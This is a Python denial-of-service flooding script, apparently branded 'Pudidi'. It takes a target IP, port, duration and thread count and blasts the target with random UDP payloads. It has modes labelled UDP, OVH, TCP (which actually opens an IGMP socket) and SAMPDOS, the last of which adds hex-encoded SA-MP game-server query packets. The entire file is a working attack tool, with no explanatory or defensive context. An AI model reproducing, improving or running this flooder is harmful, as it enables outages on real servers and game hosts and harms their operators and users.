import socket, struct, codecs, sys, threading, random, time, os


method = str(sys.argv[1])
ip = str(sys.argv[2])
port = int(sys.argv[3])
timer = int(sys.argv[4])
threads = int(sys.argv[5])
os.system('cls' if os.name == 'nt' else 'clear')

host = socket.gethostbyname(ip)

def ovh(host, port, timer):
	payload = b"\x00\x02\x00\x2f"
	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	while time.time() < timeout:
		print(f"[38;2;162;36;170mP[38;2;165;36;170mu[38;2;168;36;170md[38;2;171;36;170mi[38;2;174;36;170md[38;2;177;36;170mi[38;2;180;36;170m [38;2;183;36;170mA[38;2;186;36;170mt[38;2;189;36;170mt[38;2;192;36;170ma[38;2;195;36;170mc[38;2;198;36;170mk[38;2;201;36;170mi[38;2;204;36;170mn[38;2;207;36;170mg[38;2;210;36;170m [38;2;213;36;170mT[38;2;216;36;170mo[38;2;219;36;170m [38;2;222;36;170mI[38;2;225;36;170mp {ip} [38;2;162;36;170mA[38;2;172;36;170mn[38;2;182;36;170md[38;2;192;36;170m [38;2;202;36;170mP[38;2;212;36;170mo[38;2;222;36;170mr[38;2;232;36;170mt {port}")
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
	sys.exit()

def udp(host, port, timer):
	payload = random._urandom(615)
	payloads = random._urandom(666)
	pack = random._urandom(1024)
	packs = random._urandom(1025)
	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	while time.time() < timeout:
		print(f"[38;2;162;36;170mP[38;2;165;36;170mu[38;2;168;36;170md[38;2;171;36;170mi[38;2;174;36;170md[38;2;177;36;170mi[38;2;180;36;170m [38;2;183;36;170mA[38;2;186;36;170mt[38;2;189;36;170mt[38;2;192;36;170ma[38;2;195;36;170mc[38;2;198;36;170mk[38;2;201;36;170mi[38;2;204;36;170mn[38;2;207;36;170mg[38;2;210;36;170m [38;2;213;36;170mT[38;2;216;36;170mo[38;2;219;36;170m [38;2;222;36;170mI[38;2;225;36;170mp {ip} [38;2;162;36;170mA[38;2;172;36;170mn[38;2;182;36;170md[38;2;192;36;170m [38;2;202;36;170mP[38;2;212;36;170mo[38;2;222;36;170mr[38;2;232;36;170mt {port}")
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payloads, (host, int(port)))
		sock.sendto(pack, (host, int(port)))
		sock.sendto(packs, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payloads, (host, int(port)))
		sock.sendto(pack, (host, int(port)))
		sock.sendto(packs, (host, int(port)))
	sys.exit()

def tcp(host, port, timer):
	packs = random._urandom(4096)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
	timeout = time.time() + float(timer)
	while time.time() < timeout:
		print(f"[38;2;162;36;170mP[38;2;165;36;170mu[38;2;168;36;170md[38;2;171;36;170mi[38;2;174;36;170md[38;2;177;36;170mi[38;2;180;36;170m [38;2;183;36;170mA[38;2;186;36;170mt[38;2;189;36;170mt[38;2;192;36;170ma[38;2;195;36;170mc[38;2;198;36;170mk[38;2;201;36;170mi[38;2;204;36;170mn[38;2;207;36;170mg[38;2;210;36;170m [38;2;213;36;170mT[38;2;216;36;170mo[38;2;219;36;170m [38;2;222;36;170mI[38;2;225;36;170mp {ip} [38;2;162;36;170mA[38;2;172;36;170mn[38;2;182;36;170md[38;2;192;36;170m [38;2;202;36;170mP[38;2;212;36;170mo[38;2;222;36;170mr[38;2;232;36;170mt {port}")
		sock.sendto(packs, (host, int(port)))
		sock.sendto(packs, (host, int(port)))
		sock.sendto(packs, (host, int(port)))
		sock.sendto(packs, (host, int(port)))
		sock.sendto(packs, (host, int(port)))
		sock.sendto(packs, (host, int(port)))
		sock.sendto(packs, (host, int(port)))
		sock.sendto(packs, (host, int(port)))
	sys.exit()

def sampdos(host, port, timer):
	Attack = [
	codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'),
	codecs.decode('53414d509538e1a9611e63', 'hex_codec'),
	codecs.decode('53414d509538e1a9611e69', 'hex_codec'),
	codecs.decode('53414d509538e1a9611e72', 'hex_codec'),
	codecs.decode('081e62da', 'hex_codec'),
	codecs.decode('081e77da', 'hex_codec'),
	codecs.decode('081e4dda', 'hex_codec'),
	codecs.decode('021efd40', 'hex_codec'),
	codecs.decode('081e7eda', 'hex_codec')]
	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	while time.time() < timeout:
		print(f"[38;2;162;36;170mP[38;2;165;36;170mu[38;2;168;36;170md[38;2;171;36;170mi[38;2;174;36;170md[38;2;177;36;170mi[38;2;180;36;170m [38;2;183;36;170mA[38;2;186;36;170mt[38;2;189;36;170mt[38;2;192;36;170ma[38;2;195;36;170mc[38;2;198;36;170mk[38;2;201;36;170mi[38;2;204;36;170mn[38;2;207;36;170mg[38;2;210;36;170m [38;2;213;36;170mT[38;2;216;36;170mo[38;2;219;36;170m [38;2;222;36;170mI[38;2;225;36;170mp {ip} [38;2;162;36;170mA[38;2;172;36;170mn[38;2;182;36;170md[38;2;192;36;170m [38;2;202;36;170mP[38;2;212;36;170mo[38;2;222;36;170mr[38;2;232;36;170mt {port}")
		data = os.urandom(min(577, 1000, 1204, 1024, 999, 666, 1460, 818, 1080, 1800))
		packets = random._urandom(1025)
		packet = random._urandom(1024)
		pack = random._urandom(615)
		sock.sendto(data, (host, int(port)))
		sock.sendto(data, (host, int(port)))
		sock.sendto(data, (host, int(port)))
		sock.sendto(data, (host, int(port)))
		sock.sendto(data, (host, int(port)))
		sock.sendto(pack, (host, int(port)))
		sock.sendto(packet, (host, int(port)))
		sock.sendto(packets, (host, int(port)))
		if int(port) == 7777:
			sock.sendto(Attack[5], (host, int(port)))
		elif int(port) == 7796:
			sock.sendto(Attack[4], (host, int(port)))
		elif int(port) == 7771:
			sock.sendto(Attack[6], (host, int(port)))
		elif int(port) == 7784:
			sock.sendto(Attack[7], (host, int(port)))
	sys.exit()


for _x in range(threads):
	if method == "UDP" or method == "udp":
		threading.Thread(target=udp, args=(host, port, timer)).start()
	elif method == "OVH" or method == "ovh":
		threading.Thread(target=ovh, args=(host, port, timer)).start()
	elif method == "TCP" or method == "tcp":
		threading.Thread(target=tcp, args=(host, port, timer)).start()
	elif method == "SAMPDOS" or method == "sampdos":
		threading.Thread(target=sampdos, args=(host, port, timer)).start()